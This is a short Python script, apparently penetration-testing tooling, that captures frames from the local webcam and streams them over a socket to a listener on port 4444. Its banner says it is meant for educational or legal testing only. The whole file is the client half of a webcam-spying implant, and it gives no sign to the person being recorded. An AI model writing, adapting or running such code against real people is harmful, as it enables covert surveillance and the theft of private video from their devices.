import socket
import cv2
import struct
import pickle

HOST = '127.0.0.1'
PORT = 4444

print("#"*90)
print("     Author: Talsp")
print("     This code is to be used for educational purposes or legal penetration testing only")
print("     I do not take responsibility for any misuse or illegal action/use of this code")
print("#"*90+"\n")

cap = cv2.VideoCapture(0)

def start_client():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((HOST, PORT))
    try:
        while True:
            ret, frame = cap.read()
            if not ret:
                break

            # Serialize the frame
            data = pickle.dumps(frame)
            message_size = struct.pack("L", len(data))  # Pack the message length
            client.sendall(message_size + data)  # Send the size and the frame data

    except KeyboardInterrupt:
        print("Shutdown")
    finally:
        cap.release()
        client.close()

if __name__ == "__main__":
    start_client()
